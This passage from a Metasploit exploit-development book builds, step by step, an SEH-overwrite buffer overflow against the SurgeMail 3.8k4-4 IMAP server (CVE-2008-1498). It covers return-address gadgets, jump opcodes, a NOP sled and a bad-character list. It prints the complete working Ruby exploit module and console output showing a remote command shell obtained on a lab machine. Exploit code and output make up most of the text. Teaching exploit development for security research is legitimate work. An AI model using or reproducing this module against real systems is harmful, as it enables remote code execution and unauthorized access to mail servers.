<strong class="calibre3"><code class="calibre6">0x0078517e</code></strong> pop esi; pop ebx; ret</pre><p class="calibre2">When <code class="literal">msfpescan</code> is run against the target executable, it reads through the machine code looking for assembly instructions that match the target (a <span class="strong"><em class="calibre4">POP-POP-RETN</em></span> sequence in this case) and displays the memory address where these instructions occur. As you can see in the listing, multiple addresses are found. We’ll use the address at the end of the output, <span class="strong"><em class="calibre4">0x0078517e</em></span>, to overwrite SEH in the exploit. Having made our selection, we edit the <code class="literal">'Targets'</code> section of the exploit module to include this address and edit the <code class="literal">exploit</code> section to include it as part of the buffer to be sent, as shown next.</p><a id="I_programlisting14_d1e16715" class="strong"/><pre class="programlisting">'Platform'       =&gt; 'win',
            'Targets'        =&gt;
                [
                  <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>[ 'Windows Universal', { 'Ret' =&gt;
 <strong class="calibre3"><code class="calibre6">"\x7e\x51\x78"</code></strong> } ], # p/p/r in surgemail.exe
                ],
            'DisclosureDate' =&gt; 'March 13 2008',
            'DefaultTarget' =&gt; 0))
    end

    def exploit
        connected = connect_login
        lead = "\x41" * 10360
      <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>evil = lead + <strong class="calibre3"><code class="calibre6">[target.ret].pack("A3")</code></strong>
        print_status("Sending payload")
        sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"</pre><p class="calibre2">To perform a three-byte overwrite of the SEH, we set the three bytes to be added to the buffer in the <code class="literal">'Targets'</code> block at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16740" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, in little-endian order, as shown in boldface type in the listing. (Endian-ness is determined by the target CPU’s architecture, and Intel-compatible processors use little-endian byte ordering.)<a id="IDX-CHP-14-0044" class="strong"/><a id="IDX-CHP-14-0045" class="strong"/><a id="IDX-CHP-14-0046" class="strong"/><a id="IDX-CHP-14-0047" class="strong"/><a id="IDX-CHP-14-0048" class="strong"/><a id="IDX-CHP-14-0049" class="strong"/></p><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16768" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> we replace the three <span class="strong"><em class="calibre4">C</em></span>s in the <code class="literal">evil</code> string with <code class="literal">[target.ret].pack("A3")</code>, which will send the return address exactly as it is declared in the <code class="literal">'Targets'</code> block. When modifying many exploits that use a three-byte overwrite, you can declare the target address literally (<span class="strong"><em class="calibre4">0x0078517e</em></span> in this case) and Metasploit will automatically order the bytes correctly when you use <code class="literal">[target.ret].pack('V')</code>. This scenario requires more granular control, because if we were to send the null (00) byte, it would represent the end of a string and could prevent the exploit from functioning properly.</p><p class="calibre2">Now is a good time to run the exploit to make sure that it works properly. If you jump too far ahead when developing an exploit, you run the risk of making an error somewhere and having to do a lot of backtracking to find out what went wrong. Here’s the exploit:</p><a id="I_programlisting14_d1e16795" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use exploit/windows/imap/surgemail_book</code></strong>
  msf exploit(surgemail_book) &gt; <strong class="calibre3"><code class="calibre6">set IMAPPASS test</code></strong>
  IMAPPASS =&gt; test
  msf exploit(surgemail_book) &gt; <strong class="calibre3"><code class="calibre6">set IMAPUSER test</code></strong>
  IMAPUSER =&gt; test
  msf exploit(surgemail_book) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 192.168.1.155</code></strong>
  RHOST =&gt; 192.168.1.155
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> msf exploit(surgemail_book) &gt; <strong class="calibre3"><code class="calibre6">set PAYLOAD generic/debug_trap</code></strong>
  PAYLOAD =&gt; generic/debug_trap
  msf exploit(surgemail_book) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

  [*] Authenticating as test with password test...
  [*] Sending payload
  [*] Exploit completed, but no session was created.
  msf exploit(surgemail_book) &gt;</pre><p class="calibre2">The payload that we use at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16824" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, <code class="literal">generic/debug_trap</code>, won’t actually send a payload. Instead, it sends multiple <code class="literal">\xCC</code>s, or breakpoints, to debug the execution flow of the exploit. This is useful for confirming that your shellcode is inserted at the right places in your exploit.<a id="IDX-CHP-14-0050" class="strong"/><a id="IDX-CHP-14-0051" class="strong"/><a id="IDX-CHP-14-0052" class="strong"/><a id="IDX-CHP-14-0053" class="strong"/><a id="IDX-CHP-14-0054" class="strong"/><a id="IDX-CHP-14-0055" class="strong"/><a id="IDX-CHP-14-0056" class="strong"/><a id="IDX-CHP-14-0057" class="strong"/><a id="IDX-CHP-14-0058" class="strong"/></p><p class="calibre2">After running the exploit, open the Immunity Debugger, as shown in <a class="xref" href="part0018.html#landing_in_the_pop-pop-retn_instructions">Figure 14-5</a>, and at the crash select <span class="strong"><strong class="calibre3">View</strong></span> ▸ <span class="strong"><strong class="calibre3">SEH chain</strong></span>. Set a breakpoint by pressing F2, and then press <span class="keycap">shift</span>-F9 to pass the exception to the application and step into the <span class="strong"><em class="calibre4">POP-POP-RETN</em></span> sequence of instructions.<a id="IDX-CHP-14-0059" class="strong"/></p><p class="calibre2">Now, still in the debugger, press F7 to single-step through the instructions until you land in the <span class="strong"><em class="calibre4">41414141</em></span> contained in NSEH.</p><div class="figure"><a id="landing_in_the_pop-pop-retn_instructions" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject14_d1e16900" class="strong"/><img src="../images/00052.jpeg" alt="Landing in the POP-POP-RETN instructions" hisrc="httpatomoreillycomsourcenostarchimages867558.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 14-5. Landing in the <span class="strong"><em class="calibre4">POP-POP-RETN</em></span> instructions</div></div><p class="calibre2">Next, edit the exploit to include the instructions for the short jump backward, as shown here:</p><a id="I_programlisting14_d1e16907" class="strong"/><pre class="programlisting">def exploit
        connected = connect_login
      <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>lead = "\x41" * <strong class="calibre3"><code class="calibre6">10356</code></strong>
      <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>nseh = <strong class="calibre3"><code class="calibre6">"\xeb\xf9\x90\x90"</code></strong>
        evil = lead + nseh + [target.ret].pack("A3")
        print_status("Sending payload")
        sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
        sock.put(sploit)
        handler
        disconnect
end</pre><p class="calibre2">When editing your exploit, be sure to adjust the initial buffer length at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16929" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> as you make changes, or your alignment will be off. In this case, NSEH is being overwritten with the instructions to make a short five-byte jump backward (<code class="literal">\xeb\xf9\x90\x90</code>) <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e16938" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, where <code class="literal">eb</code> is the operation code for a short jump. The new lead buffer length is adjusted to 10,356 bytes, because these five new bytes come before the SEH overwrite.<a id="IDX-CHP-14-0060" class="strong"/><a id="IDX-CHP-14-0061" class="strong"/><a id="IDX-CHP-14-0062" class="strong"/></p><p class="calibre2">When you run the exploit again and step through the instructions in the debugger, you should land in the <span class="strong"><em class="calibre4">41</em></span>s (hexadecimal <span class="strong"><em class="calibre4">A</em></span>s) before the exception handler values. The five <code class="literal">INC ECX</code> instructions should be replaced with the code to jump farther back into the initial buffer.</p><p class="calibre2">Now we’ll change the exploit to include the “near jump” (<span class="strong"><em class="calibre4">\xe9\xdd\xd7\xff\xff</em></span>) sequence of instructions, to jump backward to a location near the beginning of the buffer. Looking at the buffer (<a class="xref" href="part0018.html#lots_of_room_for_shellcode">Figure 14-6</a>), you can see that the entire string of <span class="strong"><em class="calibre4">A</em></span>s is completely intact, leaving more than 10,000 bytes available for shellcode. Since the average space required for functional shellcode is less than 500 bytes, this leaves you ample room.</p><div class="figure"><a id="lots_of_room_for_shellcode" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject14_d1e16981" class="strong"/><img src="../images/00053.jpeg" alt="Lots of room for shellcode" hisrc="httpatomoreillycomsourcenostarchimages867560.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 14-6. Lots of room for shellcode</div></div><p class="calibre2">Now all you have to do is replace the buffer of <span class="strong"><em class="calibre4">41</em></span>s with NOPs (<code class="literal">\x90</code>) to give yourself a nice NOP slide to land in, and then you can sit back and let Metasploit take care of the shellcode.</p><a id="I_programlisting14_d1e16994" class="strong"/><pre class="programlisting">def exploit
        connected = connect_login
      <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>lead = "\x90" * (<strong class="calibre3"><code class="calibre6">10351</code></strong> - payload.encoded.length)
      <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>near = "\xe9\xdd\xd7\xff\xff"
        nseh = "\xeb\xf9\x90\x90"
      <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>evil = lead + payload.encoded + near + nseh + [target.ret].pack("A3")
        print_status("Sending payload")
        sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
        sock.put(sploit)
        handler
        disconnect
end</pre><p class="calibre2">As you can see in this listing, the initial string of <span class="strong"><em class="calibre4">A</em></span>s we used earlier is replaced by NOPs minus the length of the shellcode that Metasploit generates at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e17022" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. Notice that the buffer length, initially 10,356 bytes, has been decreased by five bytes to 10,351 to account for the near jump instructions at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e17028" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. Finally, the malicious string is built using all of the exploit’s components at <span class="inlinemediaobject"><a id="I_inlinemediaobject14_d1e17034" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>.<a id="IDX-CHP-14-0063" class="strong"/><a id="IDX-CHP-14-0064" class="strong"/></p><p class="calibre2">Now we can select a real payload and execute the module to see what happens. Surprisingly, the exploit completes but no session is created. The exploit module connects and sends its payload, but no shell is returned to us, as shown next:</p><a id="I_programlisting14_d1e17055" class="strong"/><pre class="programlisting">msf exploit(surgemail_book) &gt; <strong class="calibre3"><code class="calibre6">set payload windows/shell_bind_tcp</code></strong>
payload =&gt; windows/shell_bind_tcp

msf exploit(surgemail_book) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

[*] Started bind handler
[*] Authenticating as test with password test...
[*] Sending payload
[*] Exploit completed, but no session was created.
msf exploit(surgemail_book) &gt;</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="bad_characters_and_remote_code_execution">Bad Characters and Remote Code Execution</h2></div></div></div><p class="calibre2">Well, that certainly wasn’t expected: The exploit completes but no session is created. If you check your debugger, you’ll see that the application didn’t even crash — so what happened? Welcome to the sometimes challenging and nearly always frustrating world of <span class="strong"><em class="calibre4">bad characters</em></span>. Some characters, when sent as part of an exploit buffer, get mangled while being read by the application. The unfortunate result is that bad characters render your shellcode, and sometimes the entire exploit, unusable.</p><p class="calibre2">When writing a Metasploit module, you should always be sure to identify all the bad characters, because the shellcode that Metasploit generates differs each time an exploit is launched, and any rogue bad characters will greatly reduce a module’s reliability. In many cases, if you fail to find all the bad characters, the application will crash without running the shellcode. In the preceding example, SurgeMail didn’t even crash. The exploit appears to succeed, but we don’t get a session.</p><p class="calibre2">There are many ways to identify bad characters, including replacing the dynamically created shellcode with a string of sequential characters (<code class="literal">\x00\x01\x02</code>...), and checking the debugger to see where the first character gets mangled and marking that character as bad. One of the fastest methods, however, is to find the bad characters in the source code of similar exploits. For example, a search of the IMAP exploits as of this writing finds <code class="literal">\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b</code> listed as bad characters, as shown next:</p><a id="I_programlisting14_d1e17081" class="strong"/><pre class="programlisting">'Privileged'     =&gt; false,
'DefaultOptions'  =&gt;
    {
        'EXITFUNC' =&gt; 'thread',
    },
'Payload'         =&gt;
    {
        'Space'       =&gt; 10351,
        'DisableNops' =&gt; true,
        <strong class="calibre3"><code class="calibre6">'BadChars'    =&gt; "\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b"</code></strong>
    },
'Platform'        =&gt; 'win',
'Targets'        =&gt;</pre><p class="calibre2">When you declare <code class="literal">'BadChars'</code> in an exploit module, Metasploit will automatically exclude them from shellcode and from any automatically generated strings of text or NOPs.</p><p class="calibre2">When we run the exploit again, as shown next, after declaring bad characters, we finally get a session on the third try. The exploit still isn’t reliable, but it works because Metasploit dynamically changes the shellcode each time the exploit is run. As a result, the characters that are causing the module to fail may not always be present.</p><a id="I_programlisting14_d1e17093" class="strong"/><pre class="programlisting">msf exploit(surgemail_book) &gt; <strong class="calibre3"><code class="calibre6">rexploit</code></strong>

[*] Started bind handler
[*] Authenticating as test with password test...
[*] Sending payload
[*] Exploit completed, but no session was created.
msf exploit(surgemail_book) &gt; <strong class="calibre3"><code class="calibre6">rexploit</code></strong>

[*] Started bind handler
[*] Authenticating as test with password test...
[*] Sending payload
[*] Exploit completed, but no session was created.
msf exploit(surgemail_book) &gt; <strong class="calibre3"><code class="calibre6">rexploit</code></strong>

[*] Started bind handler
[*] Authenticating as test with password test...
[*] Sending payload
[*] Command shell session 1 opened (192.168.1.101:59501 -&gt; 192.168.1.155:4444)

(C) Copyright 1985-2001 Microsoft Corp.

c:\surgemail&gt;</pre><p class="calibre2">Determining the remaining bad characters is an exercise left for the reader. An excellent, albeit tedious, way to eliminate all bad characters is to follow the technique described at <a class="xref" href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars" target="_top">http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars</a>.</p><p class="calibre2">The current exploit code, including all of the pieces we’ve added, is shown here:</p><a id="I_programlisting14_d1e17110" class="strong"/><pre class="programlisting">require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote

    include Msf::Exploit::Remote::Imap

    def initialize(info = {})
        super(update_info(info,
            'Name'           =&gt; 'Surgemail 3.8k4-4 IMAPD LIST Buffer Overflow',
            'Description'    =&gt; %q{
                This module exploits a stack overflow in the Surgemail IMAP Server
                version 3.8k4-4 by sending an overly long LIST command. Valid IMAP
                account credentials are required.
            },
            'Author'         =&gt; [ 'ryujin' ],
            'License'        =&gt; MSF_LICENSE,
            'Version'        =&gt; '$Revision: 1 $',
            'References'     =&gt;
                [
                    [ 'BID', '28260' ],
                    [ 'CVE', '2008-1498' ],
                    [ 'URL', 'http://www.exploit-db.com/exploits/5259' ],
                ],
            'Privileged'     =&gt; false,
            'DefaultOptions' =&gt;
                {
                    'EXITFUNC' =&gt; 'thread',
                },
            'Payload'        =&gt;
                {
                    'Space'       =&gt; 10351,
                    'DisableNops' =&gt; true,
                    'BadChars'    =&gt; "\x00\x09\x0a\x0b\x0c\x0d\x20\x2c\x3a\x40\x7b"
                },
            'Platform'       =&gt; 'win',
            'Targets'        =&gt;
                [
                    [ 'Windows Universal', { 'Ret' =&gt;
 "\x7e\x51\x78" } ], # p/p/r in surgemail.exe
                ],
            'DisclosureDate' =&gt; 'March 13 2008',
            'DefaultTarget'  =&gt; 0))
    end

    def exploit
        connected = connect_login
        lead = "\x90" * (10351 - payload.encoded.length)
        near = "\xe9\xdd\xd7\xff\xff"
        nseh = "\xeb\xf9\x90\x90"
        evil = lead + payload.encoded + near + nseh + [target.ret].pack("A3")
        print_status("Sending payload")
        sploit = '0002 LIST () "/' + evil + '" "PWNED"' + "\r\n"
        sock.put(sploit)
        handler
        disconnect
    end

end</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="wrapping_up-id5">Wrapping Up</h2></div></div></div><p class="calibre2">Although we haven’t uncovered a new vulnerability in this chapter, we have covered the entire process from developing and running a fuzzer to developing a functioning exploit. The exploit that we built in this chapter is complicated and unusual, and it therefore offers an excellent opportunity to think beyond the basics and explore creative avenues to obtain code execution.</p><p class="calibre2">One of the best ways to dig deeper into Metasploit is to read through the Metasploit source files and other exploit modules to get a better idea of what is possible within the Metasploit Framework. The techniques in this chapter have given you the basic tools you’ll need to begin discovering vulnerabilities and developing Metasploit exploit modules that will take advantage of them.</p><p class="calibre2">In the next chapter we will begin to dive into porting exploits into the Framework that will build upon the knowledge you learned in this chapter. We’ll show you how to convert publicly available exploits into a working Metasploit exploit by rewriting the exploit and debugging it to see what it’s doing.</p></div></section></body></html>